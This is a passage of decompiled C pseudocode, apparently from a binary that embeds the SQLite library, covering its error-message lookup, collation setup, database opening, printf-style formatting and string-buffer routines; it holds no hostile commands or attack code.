  if ( !a3 && *(_BYTE *)(a1 + 29) == 2 )
    a3 = aMemory;
  if ( (a2 & 0x100) != 0 && (!a3 || !*a3) )
    a2 = a2 & 0xFFFFFCFF | 0x200;
  v8 = sub_10062164(a3, a1, a4, v7, a2);
  if ( !v8 && !sub_10066C25(*a4, 0, 0) )
    sub_10062612(*a4, a6);
  return v8;
}

//----- (10054233) --------------------------------------------------------
char *__usercall sub_10054233@<eax>(int a1@<esi>)
{
  int v2; // eax
  char *v3; // edi

  if ( a1 )
  {
    if ( !sub_10059D05(a1) )
      return sub_10053FC9(0x15u);
    sub_10061305(*(_DWORD *)(a1 + 68));
    if ( *(_BYTE *)(a1 + 30) )
    {
      LOBYTE(v2) = 7;
    }
    else
    {
      v3 = (char *)sub_100530C6(*(_DWORD *)(a1 + 200));
      if ( v3 )
      {
LABEL_11:
        sub_10061317(*(_DWORD *)(a1 + 68));
        return v3;
      }
      v2 = *(_DWORD *)(a1 + 20);
    }
    v3 = sub_10053FC9(v2);
    goto LABEL_11;
  }
  return sub_10053FC9(7u);
}

//----- (1005428D) --------------------------------------------------------
const wchar_t *__usercall sub_1005428D@<eax>(int a1@<esi>)
{
  const wchar_t *v2; // edi
  char *v3; // eax
  int v4; // edx

  if ( !a1 )
    return L"out of memory";
  if ( !sub_10059D05(a1) )
    return L"library routine called out of sequence";
  sub_10061305(*(_DWORD *)(a1 + 68));
  if ( *(_BYTE *)(a1 + 30) )
  {
    v2 = L"out of memory";
  }
  else
  {
    v2 = (const wchar_t *)sub_100530D9(*(_DWORD *)(a1 + 200));
    if ( !v2 )
    {
      if ( *(_DWORD *)(a1 + 200) )
      {
        v3 = sub_10053FC9(*(_DWORD *)(a1 + 20));
        sub_1005A3FE(0, v4, -1, v3, 1);
      }
      v2 = (const wchar_t *)sub_100530D9(*(_DWORD *)(a1 + 200));
    }
    *(_BYTE *)(a1 + 30) = 0;
  }
  sub_10061317(*(_DWORD *)(a1 + 68));
  return v2;
}
// 100542ED: variable 'v4' is possibly undefined
// 100FF3CC: using guessed type wchar_t aOutOfMemory[14];
// 100FF3E8: using guessed type wchar_t aLibraryRoutine[39];

//----- (10054313) --------------------------------------------------------
int __thiscall sub_10054313(void *this)
{
  int v1; // ecx

  if ( !this )
    return 7;
  if ( !sub_10059D05((int)this) )
    return 21;
  if ( *(_BYTE *)(v1 + 30) )
    return 7;
  else
    return *(_DWORD *)(v1 + 20) & *(_DWORD *)(v1 + 24);
}
// 10054326: variable 'v1' is possibly undefined

//----- (10054337) --------------------------------------------------------
int __cdecl sub_10054337(_DWORD *a1, unsigned __int8 *Src, unsigned __int8 a3, char a4, int a5, int a6)
{
  int v6; // ebx
  _BYTE *v7; // ecx
  _DWORD *v8; // esi
  int *v9; // eax
  int *v10; // edi
  int *v11; // esi
  int *v12; // eax
  _BYTE *v15; // [esp+Ch] [ebp-4h]
  int v16; // [esp+Ch] [ebp-4h]

  v6 = a3;
  v15 = sub_10059297(Src);
  if ( a3 == 4 || a3 == 8 )
    v6 = 2;
  if ( (unsigned int)(v6 - 1) > 2 )
    return 21;
  v8 = a1;
  v9 = sub_10069699((int)a1, v6, v7, 0);
  v10 = v9;
  if ( v9 && v9[3] )
  {
    if ( a1[35] )
    {
      sub_100592B1(a1, 5, aUnableToDelete_0);
      return 5;
    }
    sub_1005C640((int)a1);
    if ( (v10[1] & 0xF7) == v6 )
    {
      v11 = sub_10068FF9((int)v15, a1 + 96, Src) + 4;
      v16 = 3;
      do
      {
        if ( *((_BYTE *)v11 - 12) == *((_BYTE *)v10 + 4) )
        {
          if ( *v11 )
            ((void (__cdecl *)(_DWORD))*v11)(*(v11 - 2));
          *(v11 - 1) = 0;
        }
        v11 += 5;
        --v16;
      }
      while ( v16 );
      v8 = a1;
    }
  }
  v12 = sub_10069699((int)v8, v6, Src, 1);
  if ( v12 )
  {
    v12[3] = a6;
    v12[2] = a5;
    *((_BYTE *)v12 + 4) = v6 | a3 & 8;
    v12[4] = 0;
    *((_BYTE *)v12 + 5) = a4;
  }
  sub_100592B1(v8, 0, 0);
  return 0;
}
// 1005436F: variable 'v7' is possibly undefined

//----- (1005443F) --------------------------------------------------------
int __usercall sub_1005443F@<eax>(int a1@<edi>, int a2@<esi>, char *a3, _DWORD *a4, int a5, char *Str1)
{
  int result; // eax
  int v7; // edi
  _DWORD *v8; // esi
  int v9; // eax
  int v10; // eax
  int v11; // edi
  int v12; // eax
  bool v13; // zf
  int v14; // eax
  unsigned __int8 v15; // di
  unsigned int v16; // [esp+20h] [ebp+10h]

  *a4 = 0;
  result = sub_1005387F(a1, a2);
  if ( !result )
  {
    if ( dword_1018214C && (a5 & 0x8000u) == 0 )
    {
      if ( (a5 & 0x10000) != 0 )
        v7 = 1;
      else
        v7 = dword_10182150;
    }
    else
    {
      v7 = 0;
    }
    if ( (a5 & 0x40000) != 0 )
    {
      a5 &= ~0x20000u;
    }
    else if ( dword_101821FC )
    {
      a5 |= 0x20000u;
    }
    v16 = a5 & 0xFFFE00E7;
    v8 = sub_10059025(0x1D8u);
    if ( v8 )
    {
      if ( !v7 || (v9 = sub_100612DC(), (v8[17] = v9) != 0) )
      {
        sub_10061305(v8[17]);
        v8[2] = v8 + 104;
        v8[6] = 255;
        v8[1] = 2;
        v8[14] = -264537850;
        memcpy(v8 + 18, &unk_100FF438, 0x2Cu);
        v8[3] |= 0x100800u;
        *((_BYTE *)v8 + 28) = 1;
        *((_BYTE *)v8 + 33) = -1;
        v8[9] = 0;
        v8[98] = 0;
        v8[97] = 0;
        v8[96] = 0;
        v8[99] = 0;
        v8[67] = 0;
        v8[66] = 0;
        v8[65] = 0;
        v8[68] = 0;
        v10 = sub_100674CF(v7, (int)v8, Str1);
        *v8 = v10;
        if ( v10 )
        {
          sub_10054337(v8, (unsigned __int8 *)aBinary, 1u, 1, 0, (int)sub_10053C6D);
          sub_10054337(v8, (unsigned __int8 *)aBinary_0, 3u, 1, 0, (int)sub_10053C6D);
          sub_10054337(v8, (unsigned __int8 *)aBinary_1, 2u, 1, 0, (int)sub_10053C6D);
          sub_10054337(v8, (unsigned __int8 *)aRtrim, 1u, 0, 1, (int)sub_10053C6D);
          if ( !*((_BYTE *)v8 + 30) )
          {
            v8[11] = sub_10069699((int)v8, 1u, aBinary_2, 0);
            sub_10054337(v8, (unsigned __int8 *)aNocase, 1u, 2, 0, (int)sub_10053CCD);
            v11 = v8[2];
            v8[4] = v16;
            v12 = sub_100541BA((int)v8, v16 | 0x100, a3, (int *)(v11 + 4), 0, 2000);
            if ( v12 )
            {
              if ( v12 == 3082 )
                v12 = 7;
              sub_100592B1(v8, v12, 0);
            }
            else
            {
              *(_DWORD *)(v8[2] + 12) = sub_10069973(*(_DWORD *)(v8[2] + 4), (int)v8);
              *(_DWORD *)(v8[2] + 28) = sub_10069973(0, (int)v8);
              *(_DWORD *)v8[2] = aMain;
              *(_BYTE *)(v8[2] + 9) = 3;
              *(_DWORD *)(v8[2] + 16) = aTemp;
              *(_BYTE *)(v8[2] + 25) = 1;
              v13 = *((_BYTE *)v8 + 30) == 0;
              v8[14] = -1607883113;
              if ( v13 )
              {
                sub_100592B1(v8, 0, 0);
                sub_10068AB6((int)v8);
                sub_10061329(v8);
                if ( !sub_10054313(v8) )
                {
                  sub_100592B1(v8, 0, 0);
                  sub_10053B81(dword_10182158, (int)v8, dword_1018215C);
                }
              }
            }
          }
        }
        else
        {
          sub_100592B1(v8, 1, "no such vfs: %s", Str1);
        }
        sub_10061317(v8[17]);
      }
      else
      {
        sub_10058E74((int)v8);
        v8 = 0;
      }
    }
    v14 = sub_10054313(v8);
    v15 = v14;
    if ( v14 == 7 )
    {
      sub_10053D2E((int)v8);
      v8 = 0;
    }
    else if ( v14 )
    {
      v8[14] = 1266094736;
    }
    *a4 = v8;
    return v15;
  }
  return result;
}
// 1018214C: using guessed type int dword_1018214C;
// 10182150: using guessed type int dword_10182150;
// 10182158: using guessed type int dword_10182158;
// 1018215C: using guessed type int dword_1018215C;
// 101821FC: using guessed type int dword_101821FC;

//----- (10054704) --------------------------------------------------------
void __usercall sub_10054704(int a1@<eax>, int a2)
{
  unsigned int v3; // ebx

  if ( a2 >= 29 )
  {
    v3 = a2 / 0x1Du;
    a2 %= 0x1Du;
    do
    {
      sub_100552D1(29, a1, "                             ");
      --v3;
    }
    while ( v3 );
  }
  if ( a2 > 0 )
    sub_100552D1(a2, a1, "                             ");
}

//----- (10054749) --------------------------------------------------------
void __cdecl sub_10054749(int a1, int a2, char *a3, int *a4)
{
  int *v4; // ebx
  char *v5; // esi
  int v6; // eax
  int i; // eax
  char *v8; // ecx
  _BYTE *v9; // esi
  int v10; // eax
  int v11; // eax
  int v12; // eax
  char *v13; // esi
  char *v14; // esi
  char v15; // cl
  char *v16; // esi
  int v17; // edx
  unsigned __int8 *v18; // esi
  unsigned __int8 *v19; // edx
  double v20; // rax
  int *v21; // ebx
  int v22; // esi
  unsigned int v23; // eax
  int *v24; // ebx
  BOOL v25; // ecx
  int v26; // edi
  char v27; // cl
  char *v28; // edi
  unsigned __int64 v29; // rax
  unsigned __int64 v30; // rcx
  char *v31; // edx
  char *v32; // eax
  unsigned __int8 v33; // al
  char *v34; // eax
  char v35; // cl
  int m; // ebx
  char v37; // dl
  char v38; // bl
  int v39; // eax
  double j; // st7
  char v41; // dl
  double v42; // st7
  double v43; // st6
  double v44; // st4
  double v45; // st6
  double v46; // rt0
  double v47; // rt1
  double v48; // st6
  double v49; // st7
  double v50; // st6
  double v51; // rt2
  double v52; // rtt
  double v53; // st4
  double v54; // st7
  double v55; // st4
  double v56; // st5
  double v57; // rt1
  double v58; // rt2
  double v59; // st5
  double v60; // st7
  double v61; // st5
  int v62; // eax
  char *v63; // edi
  double v64; // rt1
  double v65; // st6
  double v66; // st7
  double v67; // rt2
  char *v68; // esi
  char v69; // bl
  int v70; // eax
  char v71; // al
  int v72; // esi
  size_t v73; // esi
  int v74; // eax
  char v75; // al
  char *v76; // eax
  char *v77; // eax
  int v78; // eax
  _BYTE *v79; // edi
  _BYTE *v80; // edi
  int v81; // edx
  _BYTE *v82; // edi
  int v83; // edi
  int v84; // edi
  signed int v85; // eax
  int k; // ecx
  int v87; // ebx
  char *v88; // ebx
  char *v89; // edi
  char v90; // bl
  int v91; // ecx
  char v92; // al
  int v93; // edx
  unsigned __int8 *v94; // esi
  char *v95; // edx
  char v96; // cl
  int v97; // ebx
  int v98; // edx
  _BYTE **v99; // ebx
  unsigned __int64 v100; // [esp-8h] [ebp-1C8h]
  double v101; // [esp+0h] [ebp-1C0h]
  char v102; // [esp+1Bh] [ebp-1A5h]
  char *v103; // [esp+1Ch] [ebp-1A4h]
  int v104; // [esp+20h] [ebp-1A0h]
  char v105; // [esp+27h] [ebp-199h]
  bool v106; // [esp+28h] [ebp-198h]
  bool v107; // [esp+29h] [ebp-197h]
  char v108; // [esp+2Ah] [ebp-196h]
  char v109; // [esp+2Bh] [ebp-195h]
  int v110; // [esp+2Ch] [ebp-194h]
  char v111; // [esp+32h] [ebp-18Eh]
  char v112; // [esp+33h] [ebp-18Dh]
  unsigned __int8 *n; // [esp+34h] [ebp-18Ch]
  double v114; // [esp+38h] [ebp-188h]
  double v115; // [esp+40h] [ebp-180h]
  char *v116; // [esp+4Ch] [ebp-174h]
  unsigned int v117; // [esp+54h] [ebp-16Ch]
  double v118; // [esp+58h] [ebp-168h]
  char v119; // [esp+60h] [ebp-160h] BYREF
  char v120[346]; // [esp+61h] [ebp-15Fh] BYREF
  char v121[2]; // [esp+1BBh] [ebp-5h] BYREF
  char v122[3]; // [esp+1BDh] [ebp-3h] BYREF
  _BYTE *v123; // [esp+1D0h] [ebp+10h]
  char *v124; // [esp+1D0h] [ebp+10h]

  v103 = 0;
  v4 = a4;
  v5 = a3;
  v6 = *a3;
  if ( *a3 )
  {
    while ( 1 )
    {
      if ( v6 != 37 )
      {
        v103 = v5;
        for ( i = 1; ; ++i )
        {
          v8 = (char *)*++v5;
          v116 = v8;
          if ( v8 == (char *)37 || !v8 )
            break;
        }
        sub_100552D1(i, a1, v103);
        if ( !v116 )
          return;
      }
      v9 = v5 + 1;
      v10 = (char)*v9;
      v123 = v9;
      if ( !*v9 )
      {
        sub_100552D1(1, a1, asc_10182654);
        return;
      }
      v112 = 0;
      v111 = 0;
      v109 = 0;
      v106 = 0;
      v107 = 0;
      v108 = 0;
      do
      {
        switch ( v10 )
        {
          case ' ':
            v106 = 1;
            break;
          case '!':
            v111 = 1;
            break;
          case '#':
            v109 = 1;
            break;
          case '+':
            v107 = 1;
            break;
          case '-':
            v108 = 1;
            break;
          case '0':
            v112 = 1;
            break;
          default:
            goto LABEL_25;
        }
        v10 = (char)*++v9;
        v123 = v9;
      }
      while ( *v9 );
LABEL_25:
      v110 = 0;
      if ( v10 == 42 )
      {
        v11 = *v4++;
        a4 = v4;
        v110 = v11;
        if ( v11 < 0 )
        {
          v110 = -v110;
          v108 = 1;
        }
        v10 = (char)*++v9;
        v123 = v9;
      }
      else
      {
        if ( v10 < 48 )
          goto LABEL_34;
        do
        {
          if ( v10 > 57 )
            break;
          ++v9;
          v110 = 10 * v110 + v10 - 48;
          v10 = (char)*v9;
          v123 = v9;
        }
        while ( v10 >= 48 );
      }
      if ( v110 > 340 )
        v110 = 340;
LABEL_34:
      if ( v10 == 46 )
      {
        v104 = 0;
        v10 = (char)*++v9;
        v123 = v9;
        if ( v10 == 42 )
        {
          v12 = *v4++;
          a4 = v4;
          v104 = v12;
          if ( v12 < 0 )
            v104 = -v104;
          v10 = (char)*++v9;
          v123 = v9;
        }
        else
        {
          while ( v10 >= 48 && v10 <= 57 )
          {
            ++v9;
            v104 = 10 * v104 + v10 - 48;
            v10 = (char)*v9;
            v123 = v9;
          }
        }
      }
      else
      {
        v104 = -1;
      }
      if ( v10 == 108 )
      {
        v13 = v9 + 1;
        v10 = *v13;
        v102 = 1;
        v123 = v13;
        if ( v10 == 108 )
        {
          v14 = v13 + 1;
          v10 = *v14;
          v15 = 1;
          v123 = v14;
          goto LABEL_49;
        }
      }
      else
      {
        v102 = 0;
      }
      v15 = 0;
LABEL_49:
      v16 = (char *)&unk_100FF288;
      n = (unsigned __int8 *)&unk_100FF288;
      v105 = 0;
      v17 = 0;
      while ( v10 != *v16 )
      {
        v16 += 6;
        ++v17;
        if ( (int)v16 >= (int)&unk_100FF312 )
        {
          v18 = n;
          goto LABEL_56;
        }
      }
      v19 = (unsigned __int8 *)&unk_100FF288 + 6 * v17;
      v18 = v19;
      n = v19;
      if ( !a2 && (v19[2] & 2) != 0 )
        return;
      v105 = v19[3];
LABEL_56:
      v116 = 0;
      if ( v104 > 310 && (v18[2] & 4) == 0 )
        v104 = 310;
      switch ( v105 )
      {
        case 1:
        case 16:
          goto LABEL_61;
        case 2:
        case 3:
        case 4:
          v114 = *(double *)v4;
          a4 = v4 + 2;
          if ( v104 < 0 )
            v104 = 6;
          if ( v104 > 165 )
            v104 = 165;
          if ( v114 >= 0.0 )
          {
            if ( v107 )
              v37 = 43;
            else
              v37 = !v106 ? 0 : 0x20;
          }
          else
          {
            v37 = 45;
            v114 = -v114;
          }
          v38 = v105;
          v102 = v37;
          if ( v105 == 4 && v104 > 0 )
            --v104;
          v39 = v104;
          for ( j = 0.5; ; j = v115 * 0.1 )
          {
            v115 = j;
            if ( v39 <= 0 )
              break;
            --v39;
          }
          if ( v105 == 2 )
            v114 = v115 + v114;
          v101 = v114;
          v103 = 0;
          if ( sub_1005926E() )
          {
            v103 = aNan;
            m = 3;
            goto LABEL_251;
          }
          v42 = v114;
          if ( v114 <= 0.0 )
          {
            v45 = 10.0;
            goto LABEL_146;
          }
          v43 = 1.0e32;
          if ( v114 < 1.0e32 )
            goto LABEL_118;
          while ( 2 )
          {
            if ( (int)v103 <= 350 )
            {
              v103 += 32;
              v47 = v43;
              v48 = v42;
              v49 = v47;
              v50 = v48 * 1.0e-32;
              v114 = v50;
              if ( v50 >= v47 )
              {
                v46 = v50;
                v43 = v49;
                v42 = v46;
                continue;
              }
              v42 = v50;
            }
            break;
          }
LABEL_118:
          while ( v42 >= 100000000.0 )
          {
            if ( (int)v103 > 350 )
              break;
            v103 += 8;
            v42 = v42 * 0.00000001;
            v114 = v42;
          }
          for ( ; v42 >= 10.0; v114 = v42 )
          {
            if ( (int)v103 > 350 )
              break;
            ++v103;
            v42 = v42 * 0.1;
          }
          v44 = 0.00000001;
          if ( v42 < 0.00000001 )
          {
            while ( 1 )
            {
              v103 -= 8;
              v52 = v44;
              v53 = v42;
              v54 = v52;
              v55 = v53 * 100000000.0;
              if ( v55 >= v52 )
                break;
              v51 = v55;
              v44 = v54;
              v42 = v51;
            }
            v114 = v55;
            v45 = 10.0;
            v42 = v55;
          }
          else
          {
            v45 = 10.0;
          }
          v56 = 1.0;
          if ( v42 < 1.0 )
          {
            while ( 1 )
            {
              --v103;
              v58 = v56;
              v59 = v42;
              v60 = v58;
              v61 = v59 * v45;
              if ( v61 >= v58 )
                break;
              v57 = v61;
              v56 = v60;
              v42 = v57;
            }
            v114 = v61;
            v42 = v61;
          }
          if ( (int)v103 > 350 )
          {
            if ( v41 == 45 )
            {
              v103 = aInf;
            }
            else
            {
              v103 = aInf_0;
              if ( v41 != 43 )
                v103 = aInf_1;
            }
LABEL_143:
            v62 = (int)sub_10059297(v103);
            goto LABEL_144;
          }
LABEL_146:
          v107 = v38 == 3;
          v63 = &v119;
          if ( v38 != 2 )
          {
            v64 = v45;
            v65 = v42 + v115;
            v66 = v64;
            v114 = v65;
            if ( v65 >= v64 )
            {
              v65 = v65 * 0.1;
              ++v103;
              v114 = v65;
            }
            v67 = v65;
            v45 = v66;
            v42 = v67;
          }
          if ( v38 == 4 )
          {
            v106 = v109 == 0;
            if ( (int)v103 >= -4 && (int)v103 <= v104 )
            {
              v105 = 2;
              v104 -= (int)v103;
LABEL_154:
              v68 = v103;
              goto LABEL_155;
            }
            v105 = 3;
          }
          else
          {
            v106 = 0;
            if ( v38 != 3 )
              goto LABEL_154;
          }
          v68 = 0;
LABEL_155:
          LODWORD(v115) = 0;
          v69 = v109 | v111 | (v104 > 0);
          if ( v41 )
          {
            v119 = v41;
            v63 = v120;
          }
          if ( (int)v68 >= 0 )
          {
            do
            {
              v70 = LODWORD(v115)++;
              if ( v70 < 16 )
              {
                LODWORD(v114) = (int)v42;
                v71 = (int)v42 + 48;
                v42 = (v42 - (double)(int)v42) * v45;
              }
              else
              {
                v71 = 48;
              }
              *v63++ = v71;
              --v68;
            }
            while ( (int)v68 >= 0 );
            v114 = v42;
          }
          else
          {
            *v63++ = 48;
          }
          if ( v69 )
            *v63++ = 46;
          v72 = (int)(v68 + 1);
          if ( v72 < 0 )
          {
            v73 = -v72;
            memset(v63, 48, v73);
            v42 = v114;
            v45 = 10.0;
            v63 += v73;
            v104 -= v73;
          }
          while ( v104 > 0 )
          {
            --v104;
            v74 = LODWORD(v115)++;
            if ( v74 < 16 )
            {
              LODWORD(v114) = (int)v42;
              v75 = (int)v42 + 48;
              v42 = (v42 - (double)(int)v42) * v45;
            }
            else
            {
              v75 = 48;
            }
            *v63++ = v75;
          }
          if ( v106 && v69 )
          {
            while ( 1 )
            {
              v76 = v63 - 1;
              if ( *(v63 - 1) != 48 )
                break;
              --v63;
              *v76 = 0;
            }
            v77 = v63 - 1;
            if ( *(v63 - 1) == 46 )
            {
              if ( v111 )
              {
                *v63++ = 48;
              }
              else
              {
                --v63;
                *v77 = 0;
              }
            }
          }
          if ( v107 || v105 == 3 )
          {
            *v63 = a0123456789abcd[n[4]];
            v78 = (int)v103;
            v79 = v63 + 1;
            if ( (int)v103 >= 0 )
            {
              *v79 = 43;
              v80 = v79 + 1;
            }
            else
            {
              *v79 = 45;
              v80 = v79 + 1;
              v78 = -v78;
              v103 = (char *)v78;
            }
            if ( v78 >= 100 )
            {
              *v80++ = v78 / 100 + 48;
              v103 = (char *)(v78 % 100);
            }
            v81 = (int)v103 % 10;
            *v80 = (int)v103 / 10 + 48;
            v82 = v80 + 1;
            *v82 = v81 + 48;
            v63 = v82 + 1;
          }
          *v63 = 0;
          v83 = v63 - &v119;
          m = v83;
          v103 = &v119;
          if ( !v112 )
            goto LABEL_251;
          if ( v108 )
            goto LABEL_254;
          if ( v83 < v110 )
          {
            v84 = v110;
            v85 = v110 - m;
            for ( k = v110; k >= v85; --k )
              v120[k - 1] = v120[k - 1 - v85];
            if ( v85 )
              memset(&v120[(v102 != 0) - 1], 48, v85);
            m = v84;
            goto LABEL_251;
          }
          goto LABEL_252;
        case 5:
          *(_DWORD *)*a4++ = *(_DWORD *)(a1 + 12);
          goto LABEL_202;
        case 6:
        case 7:
          a4 = v4 + 1;
          v88 = (char *)*v4;
          v103 = v88;
          if ( v88 )
          {
            if ( v105 == 7 )
              v116 = v88;
          }
          else
          {
            v103 = (char *)&unk_1018639B;
          }
          if ( v104 < 0 )
            goto LABEL_143;
          for ( m = 0; m < v104; ++m )
          {
            if ( !v103[m] )
              break;
          }
          goto LABEL_251;
        case 8:
          v119 = 37;
          v103 = &v119;
          m = 1;
          goto LABEL_251;
        case 9:
          a4 = v4 + 1;
          v87 = *v4;
          v119 = v87;
          if ( v104 < 0 )
          {
            m = 1;
          }
          else
          {
            if ( v104 > 1 )
              memset(v120, v87, v104 - 1);
            m = v104;
          }
          v103 = &v119;
          goto LABEL_251;
        case 10:
        case 11:
        case 15:
          v89 = (char *)*a4++;
          v90 = v105 != 15 ? 39 : 34;
          n = (unsigned __int8 *)(v89 == 0);
          if ( !v89 )
          {
            v89 = aNull;
            if ( v105 != 11 )
              v89 = aNull_0;
          }
          v91 = v104;
          v92 = *v89;
          v93 = 0;
          v94 = 0;
          while ( v92 && v91 )
          {
            if ( v92 == v90 )
              ++v93;
            v92 = v89[(_DWORD)++v94];
            --v91;
          }
          LODWORD(v115) = !n && v105 == 11;
          if ( (int)&v94[2 * LODWORD(v115) + 1 + v93] <= 350 )
          {
            v95 = &v119;
            v103 = &v119;
          }
          else
          {
            v116 = (char *)sub_10058C4C((int)&v94[2 * LODWORD(v115) + 1 + v93]);
            v95 = v116;
            v103 = v116;
            if ( !v116 )
            {
              *(_BYTE *)(a1 + 24) = 1;
              return;
            }
          }
          v62 = 0;
          if ( LODWORD(v115) )
          {
            *v95 = v90;
            v62 = 1;
          }
          for ( n = 0; (int)n < (int)v94; ++n )
          {
            v96 = v89[(_DWORD)n];
            v95[v62++] = v96;
            if ( v96 == v90 )
              v95[v62++] = v96;
          }
          if ( LODWORD(v115) )
            v95[v62++] = v90;
          v95[v62] = 0;
LABEL_144:
          m = v62;
LABEL_251:
          if ( !v108 )
          {
LABEL_252:
            if ( v110 - m > 0 )
              sub_10054704(a1, v110 - m);
          }
LABEL_254:
          if ( m > 0 )
            sub_100552D1(m, a1, v103);
          if ( v108 && v110 - m > 0 )
            sub_10054704(a1, v110 - m);
          if ( v116 )
            sub_10058E74((int)v116);
          v124 = v123 + 1;
          v6 = *v124;
          if ( !*v124 )
            return;
          v4 = a4;
          v5 = v124;
          break;
        case 12:
          a4 = v4 + 1;
          v97 = *v4;
          if ( v97 )
            sub_100552D1(*(_DWORD *)(v97 + 4), a1, *(_BYTE **)v97);
LABEL_202:
          m = 0;
          v110 = 0;
          goto LABEL_251;
        case 13:
          v98 = *a4;
          a4 += 2;
          v99 = (_BYTE **)(56 * *(a4 - 1) + v98 + 8);
          if ( *v99 )
          {
            sub_100552D1(-1, a1, *v99);
            sub_100552D1(1, a1, asc_10182680);
          }
          sub_100552D1(-1, a1, v99[1]);
          v110 = 0;
          m = 0;
          goto LABEL_251;
        case 14:
          v15 = 0;
          v102 = 1;
LABEL_61:
          if ( (v18[2] & 1) != 0 )
          {
            if ( v15 )
            {
              v20 = *(double *)v4;
              v21 = v4 + 2;
            }
            else
            {
              LODWORD(v20) = *v4;
              v21 = v4 + 1;
              *(_QWORD *)&v20 = SLODWORD(v20);
            }
            a4 = v21;
            if ( v20 >= 0.0 )
            {
              v117 = HIDWORD(v20);
              v22 = LODWORD(v20);
              if ( v107 )
                v102 = 43;
              else
                v102 = !v106 ? 0 : 0x20;
            }
            else
            {
              v117 = -*(_QWORD *)&v20 >> 32;
              v22 = -LODWORD(v20);
              v102 = 45;
            }
          }
          else
          {
            if ( v15 )
            {
              v23 = v4[1];
              v22 = *v4;
              v24 = v4 + 2;
              v117 = v23;
            }
            else
            {
              v22 = *v4;
              v24 = v4 + 1;
              v117 = 0;
            }
            a4 = v24;
            v102 = 0;
          }
          if ( !(v117 | v22) )
            v109 = 0;
          if ( v112 )
          {
            v25 = v102 != 0;
            if ( v104 < v110 - v25 )
              v104 = v110 - v25;
          }
          v103 = v122;
          if ( v105 == 16 )
          {
            *(_QWORD *)&v101 = 10i64;
            v100 = __PAIR64__(v117, v22);
            HIDWORD(v114) = (__PAIR64__(v117, v22) % 0xA) >> 32;
            v26 = __PAIR64__(v117, v22) % 0xA;
            if ( v26 >= 4
              || (*(_QWORD *)&v101 = 10i64, v100 = __PAIR64__(v117, v22) / 0xA, __PAIR64__(v117, v22) / 0xA % 0xA == 1) )
            {
              v26 = 0;
            }
            v27 = byte_100FF334[2 * v26];
            v121[1] = byte_100FF335[2 * v26];
            v121[0] = v27;
            v103 = v121;
          }
          v28 = &a0123456789abcd[n[4]];
          *(_QWORD *)&v118 = n[1];
          do
          {
            --v103;
            v101 = v118;
            v100 = __PAIR64__(v117, v22);
            v30 = __PAIR64__(v117, v22) % *(_QWORD *)&v118;
            v29 = __PAIR64__(v117, v22) / *(_QWORD *)&v118;
            *v103 = v28[__PAIR64__(v117, v22) % *(_QWORD *)&v118];
            HIDWORD(v114) = HIDWORD(v30);
            v117 = HIDWORD(v29);
            v22 = v29;
          }
          while ( v29 );
          v31 = v103;
          v32 = &v103[v104 - (_DWORD)v122];
          if ( (int)v32 > 0 )
          {
            do
            {
              --v31;
              --v32;
              *v31 = 48;
            }
            while ( (int)v32 > 0 );
            v103 = v31;
          }
          if ( v102 )
          {
            v103 = --v31;
            *v31 = v102;
          }
          if ( v109 )
          {
            v33 = n[5];
            if ( v33 )
            {
              v34 = &aX0[v33];
              v35 = *v34;
              if ( *v34 )
              {
                do
                {
                  --v31;
                  ++v34;
                  *v31 = v35;
                  v35 = *v34;
                }
                while ( *v34 );
                v103 = v31;
              }
            }
          }
          m = v122 - v31;
          goto LABEL_251;
        default:
          return;
      }
    }
  }
}
// 10054D59: variable 'v41' is possibly undefined

//----- (100552D1) --------------------------------------------------------
void __usercall sub_100552D1(int a1@<eax>, int a2@<edi>, _BYTE *Src)
{
  signed int v3; // ebx
  bool v4; // zf
  int v5; // ecx
  int v6; // eax
  int v7; // ecx
  int v8; // esi
  _DWORD *v9; // eax
  _DWORD *v10; // [esp+8h] [ebp-4h]

  v3 = a1;
  if ( !(*(_BYTE *)(a2 + 26) | *(_BYTE *)(a2 + 24)) )
  {
    v4 = a1 == 0;
    if ( a1 < 0 )
    {
      v3 = (signed int)sub_10059297(Src);
      v4 = v3 == 0;
    }
    if ( !v4 && Src )
    {
      v5 = *(_DWORD *)(a2 + 12);
      v6 = *(_DWORD *)(a2 + 16);
      if ( v5 + v3 >= v6 )
      {
        if ( *(_BYTE *)(a2 + 25) )
        {
          v7 = *(_DWORD *)(a2 + 12) + v3 + 1;
          if ( *(int *)(a2 + 12) + (__int64)(v3 + 1) > *(int *)(a2 + 20) )
          {
            sub_100553E9((int *)a2);
            *(_BYTE *)(a2 + 26) = 1;
            return;
          }
          v8 = *(_DWORD *)a2;
          *(_DWORD *)(a2 + 16) = v7;
          v9 = sub_10059073(v8, v7);
          v10 = v9;
          if ( !v9 )
          {
            *(_BYTE *)(a2 + 24) = 1;
            sub_100553E9((int *)a2);
            return;
          }
          memcpy(v9, *(const void **)(a2 + 8), *(_DWORD *)(a2 + 12));
          sub_100553E9((int *)a2);
          *(_DWORD *)(a2 + 8) = v10;
        }
        else
        {
          v3 = v6 - v5 - 1;
          *(_BYTE *)(a2 + 26) = 1;
          if ( v3 <= 0 )
            return;
        }
      }
      memcpy((void *)(*(_DWORD *)(a2 + 12) + *(_DWORD *)(a2 + 8)), Src, v3);
      *(_DWORD *)(a2 + 12) += v3;
    }
  }
}

//----- (1005539C) --------------------------------------------------------
int __usercall sub_1005539C@<eax>(int a1@<edi>)
{
  int v1; // eax
  _DWORD *v2; // eax

  v1 = *(_DWORD *)(a1 + 8);
  if ( v1 )
  {
    *(_BYTE *)(v1 + *(_DWORD *)(a1 + 12)) = 0;
    if ( *(_BYTE *)(a1 + 25) )
    {
      if ( *(_DWORD *)(a1 + 8) == *(_DWORD *)(a1 + 4) )
      {
        v2 = sub_10059073(*(_DWORD *)a1, *(_DWORD *)(a1 + 12) + 1);
        *(_DWORD *)(a1 + 8) = v2;
        if ( v2 )
          memcpy(v2, *(const void **)(a1 + 4), *(_DWORD *)(a1 + 12) + 1);
        else
          *(_BYTE *)(a1 + 24) = 1;
      }
    }
  }
  return *(_DWORD *)(a1 + 8);
}

//----- (100553E9) --------------------------------------------------------
void __usercall sub_100553E9(int *a1@<esi>)
{
  if ( a1[2] != a1[1] )
    sub_10058EC7(*a1, a1[2]);
  a1[2] = 0;
}

//----- (10055400) --------------------------------------------------------
int __usercall sub_10055400@<eax>(int result@<eax>, int a2@<edx>, int a3@<ecx>, int a4)
{
  *(_DWORD *)(result + 4) = a3;
  *(_DWORD *)(result + 8) = a3;
  *(_DWORD *)(result + 16) = a2;
  *(_DWORD *)result = 0;
  *(_DWORD *)(result + 12) = 0;
  *(_DWORD *)(result + 20) = a4;
  *(_BYTE *)(result + 25) = 1;
  *(_BYTE *)(result + 26) = 0;
  *(_BYTE *)(result + 24) = 0;
  return result;
}

